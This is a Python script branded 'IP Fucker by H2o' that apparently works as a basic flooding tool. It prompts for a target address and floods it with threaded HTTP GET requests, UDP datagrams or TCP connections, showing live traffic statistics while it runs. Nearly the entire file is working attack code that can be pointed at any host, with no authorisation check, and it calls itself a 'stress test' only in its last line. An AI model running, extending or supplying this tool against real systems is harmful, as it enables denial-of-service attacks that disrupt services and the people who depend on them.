import threading
import requests
import socket
import sys
import time
import shutil
from colorama import Fore, Style, init
import psutil
import os

# --------------------------
init(autoreset=True)

# --- HUGE ASCII HEADER ---
term_width = shutil.get_terminal_size().columns
header_lines = [
    r" .S   .S_sSSs            sSSs   .S       S.     sSSs   .S    S.     sSSs   .S_sSSs    ",
    r".SS  .SS~YS%%b          d%%SP  .SS       SS.   d%%SP  .SS    SS.   d%%SP  .SS~YS%%b   ",
    r"S%S  S%S   `S%b        d%S'    S%S       S%S  d%S'    S%S    S&S  d%S'    S%S   `S%b  ",
    r"S%S  S%S    S%S        S%S     S%S       S%S  S%S     S%S    d*S  S%S     S%S    S%S  ",
    r"S&S  S%S    d*S        S&S     S&S       S&S  S&S     S&S   .S*S  S&S     S%S    d*S  ",
    r"S&S  S&S   .S*S        S&S_Ss  S&S       S&S  S&S     S&S_sdSSS   S&S_Ss  S&S   .S*S  ",
    r"S&S  S&S_sdSSS         S&S~SP  S&S       S&S  S&S     S&S~YSSY%b  S&S~SP  S&S_sdSSS   ",
    r"S&S  S&S~YSSY          S&S     S&S       S&S  S&S     S&S    `S%  S&S     S&S~YSY%b   ",
    r"S*S  S*S               S*b     S*b       d*S  S*b     S*S     S%  S*b     S*S   `S%b  ",
    r"S*S  S*S               S*S     S*S.     .S*S  S*S.    S*S     S&  S*S.    S*S    S%S  ",
    r"S*S  S*S               S*S      SSSbs_sdSSS    SSSbs  S*S     S&   SSSbs  S*S    S&S  ",
    r"S*S  S*S               S*S       YSSP~YSSY      YSSP  S*S     SS    YSSP  S*S    SSS  ",
    r"SP   SP                SP                             SP                  SP          ",
    r"Y    Y                 Y                              Y                   Y           ",
    r"                         IP Fucker by H2o"
]

def print_centered(lines, color=Fore.GREEN):
    for line in lines:
        print(color + line.center(term_width))

# Clear terminal & print header once
os.system('cls' if os.name == 'nt' else 'clear')
print_centered(header_lines, Fore.GREEN)
header_height = len(header_lines)

# --- USER INPUT ---
print(Fore.YELLOW + "\nWelcome to IP Fucker by H2o")
target = input(Fore.YELLOW + "Enter target URL/IP (for TCP/UDP use IP:PORT): ").strip()

print(Fore.YELLOW + "Select attack type: HTTP / UDP / TCP")
while True:
    attack_type = input("> ").strip().upper()
    if attack_type in ["HTTP", "UDP", "TCP"]:
        break
    print("Invalid choice. Pick HTTP, UDP, or TCP.")

num_threads = int(input(Fore.YELLOW + "Number of threads (start small, e.g., 5): ").strip())
requests_per_thread = int(input(Fore.YELLOW + "Requests per thread (e.g., 50): ").strip())

# --- GLOBAL COUNTERS ---
sent_counter = 0
sent_lock = threading.Lock()

# --- ATTACK FUNCTIONS ---
def http_attack():
    global sent_counter
    for _ in range(requests_per_thread):
        try:
            response = requests.get(target)
            with sent_lock:
                sent_counter += 1
        except:
            pass

def udp_attack():
    global sent_counter
    ip, port = target.split(":")
    port = int(port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(requests_per_thread):
        try:
            sock.sendto(b"HELLO", (ip, port))
            with sent_lock:
                sent_counter += 1
        except:
            pass

def tcp_attack():
    global sent_counter
    ip, port = target.split(":")
    port = int(port)
    for _ in range(requests_per_thread):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(b"HELLO")
            sock.close()
            with sent_lock:
                sent_counter += 1
        except:
            pass

# --- SELECT FUNCTION ---
attack_func = {"HTTP": http_attack, "UDP": udp_attack, "TCP": tcp_attack}[attack_type]

# --- START THREADS ---
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=attack_func)
    t.start()
    threads.append(t)

# --- LIVE STATS BELOW HEADER ---
prev_net = psutil.net_io_counters()
try:
    while any(t.is_alive() for t in threads):
        cpu = psutil.cpu_percent()
        net = psutil.net_io_counters()
        sent_kb = (net.bytes_sent - prev_net.bytes_sent) / 1024
        recv_kb = (net.bytes_recv - prev_net.bytes_recv) / 1024

        # Move cursor below header
        sys.stdout.write(f"\033[{header_height+1};0H")  # move cursor to line below header
        sys.stdout.write("\033[J")  # clear below header

        # Print stats
        print(Fore.CYAN + f"Target: {target}")
        print(Fore.CYAN + f"Attack type: {attack_type} | Threads: {num_threads} | Requests per thread: {requests_per_thread}")
        print(Fore.CYAN + f"CPU: {cpu:.1f}% | Sent: {sent_kb:.1f} KB | Recv: {recv_kb:.1f} KB | Packets sent: {sent_counter}")
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopped by user.")

print("\n" + Fore.GREEN + "Stress Test Complete!")
